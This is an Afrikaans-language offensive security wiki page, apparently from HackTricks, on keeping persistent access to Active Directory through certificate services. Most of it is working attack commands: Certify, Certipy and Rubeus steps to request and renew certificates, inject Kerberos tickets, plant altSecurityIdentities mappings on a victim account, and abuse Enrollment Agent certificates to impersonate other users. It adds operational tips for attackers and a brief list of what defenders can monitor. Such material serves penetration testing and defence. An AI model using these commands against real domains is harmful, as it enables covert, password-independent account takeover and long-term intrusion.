# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n klein opsomming van die rekening volharding hoofstukke van die wonderlike navorsing van [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Verstaan Aktiewe Gebruiker Kredensiaal Diefstal met Sertifikate – PERSIST1

In 'n scenario waar 'n sertifikaat wat domeinverifikasie toelaat deur 'n gebruiker aangevra kan word, het 'n aanvaller die geleentheid om hierdie sertifikaat aan te vra en te steel om volharding op 'n netwerk te handhaaf. Standaard laat die `User` sjabloon in Active Directory sulke versoeke toe, alhoewel dit soms gedeaktiveer mag wees.

Met [Certify](https://github.com/GhostPack/Certify) of [Certipy](https://github.com/ly4k/Certipy) kan jy soek na geaktiveerde sjablone wat kliëntverifikasie toelaat en dan een aan vra:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Die krag van 'n sertifikaat lê in sy vermoë om as die gebruiker waarvoor dit behoort, te autentiseer, ongeag wagwoordveranderings, solank die sertifikaat geldig bly.

Jy kan PEM na PFX omskakel en dit gebruik om 'n TGT te verkry:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Let wel: In kombinasie met ander tegnieke (sien DIEFSTAL afdelings), stel sertifikaat-gebaseerde outentisering volgehoue toegang moontlik sonder om LSASS aan te raak en selfs vanuit nie-verhoogde kontekste.

## Verkryging van Masjien Volgehouendheid met Sertifikate - PERSIST2

As 'n aanvaller verhoogde regte op 'n gasheer het, kan hulle die gecompromitteerde stelsel se masjienrekening registreer vir 'n sertifikaat met behulp van die standaard `Machine` sjabloon. Outentisering as die masjien stel S4U2Self vir plaaslike dienste in staat en kan duursame gasheer volgehouendheid bied:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Die misbruik van die geldigheid en hernuwing periodes van sertifikaat sjablone laat 'n aanvaller toe om langtermyn toegang te behou. As jy 'n voorheen uitgereikte sertifikaat en sy private sleutel besit, kan jy dit voor vervaldatum hernu om 'n vars, langlewend credential te verkry sonder om addisionele versoek artefakte wat aan die oorspronklike prinsiep gekoppel is, agter te laat.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasionele wenk: Hou lewensduur van aanvaller-gehou PFX-lêers dop en hernu vroeg. Hernuwing kan ook veroorsaak dat opgedateerde sertifikate die moderne SID-kaart uitbreidings insluit, wat dit bruikbaar hou onder strenger DC-kaartreëls (sien volgende afdeling).

## Planting Expliciete Sertifikaat Mappings (altSecurityIdentities) – PERSIST4

As jy na 'n teikenrekening se `altSecurityIdentities` attribuut kan skryf, kan jy 'n aanvaller-beheerde sertifikaat eksplisiet aan daardie rekening koppel. Dit bly bestaan oor wagwoordveranderings en, wanneer sterk kaartformate gebruik word, bly dit funksioneel onder moderne DC-afdwinging.

Hoëvlak vloei:

1. Verkry of uitgee 'n kliënt-auth sertifikaat wat jy beheer (bv. registreer `User` sjabloon as jouself).
2. Trek 'n sterk identifiseerder uit die sertifikaat (Uittreksel+Serieel, SKI, of SHA1-Publieke Sleutel).
3. Voeg 'n eksplisiete kaart by die slagoffer se `altSecurityIdentities` met behulp van daardie identifiseerder.
4. Verifieer met jou sertifikaat; die DC koppel dit aan die slagoffer via die eksplisiete kaart.

Voorbeeld (PowerShell) met 'n sterk Uittreksel+Serieel kaart:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Dan autentiseer met jou PFX. Certipy sal 'n TGT direk verkry:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notes
- Gebruik slegs sterk kaarttipe: X509IssuerSerialNumber, X509SKI, of X509SHA1PublicKey. Swak formate (Subject/Issuer, Subject-only, RFC822 e-pos) is verouderd en kan deur DC-beleid geblokkeer word.
- Die sertifikaatketting moet na 'n wortel bou wat deur die DC vertrou word. Enterprise CAs in NTAuth word tipies vertrou; sommige omgewings vertrou ook openbare CAs.

Vir meer oor swak eksplisiete kaartings en aanvalspaaie, sien:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

As jy 'n geldige Sertifikaatversoekagent/Enrollment Agent-sertifikaat verkry, kan jy nuwe aanmeldbare sertifikate namens gebruikers op aanvraag mint en die agent PFX aflyn hou as 'n volhardingstoken. Misbruik werkstroom:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Die herroeping van die agentsertifikaat of sjabloon toestemmings is nodig om hierdie volharding te verwyder.

## 2025 Sterk Sertifikaat Kaartlegging Handhaving: Impak op Volharding

Microsoft KB5014754 het Sterk Sertifikaat Kaartlegging Handhaving op domeinbeheerders bekendgestel. Sedert 11 Februarie 2025, is DC's standaard op Volle Handhaving, wat swak/onduidelike kaartleggings verwerp. Praktiese implikasies:

- Pre-2022 sertifikate wat die SID kaartlegging uitbreiding ontbreek, mag implisiete kaartlegging misluk wanneer DC's in Volle Handhaving is. Aanvallers kan toegang behou deur sertifikate te hernu via AD CS (om die SID uitbreiding te verkry) of deur 'n sterk eksplisiete kaartlegging in `altSecurityIdentities` te plant (PERSIST4).
- Eksplisiete kaartleggings wat sterk formate gebruik (Uitreiker+Serie, SKI, SHA1-Publieke Sleutel) werk steeds. Swak formate (Uitreiker/Onderwerp, Slegs Onderwerp, RFC822) kan geblokkeer word en moet vermy word vir volharding.

Administrateurs moet monitor en waarsku oor:
- Veranderinge aan `altSecurityIdentities` en die uitreiking/hernuwing van Registrasie Agent en Gebruiker sertifikate.
- CA uitreikingslogs vir namens versoeke en ongewone hernuwing patrone.

## Verwysings

- Microsoft. KB5014754: Sertifikaat-gebaseerde outentikasie veranderinge op Windows domeinbeheerders (handhaving tydlyn en sterk kaartleggings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Opdrag Verwysing (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
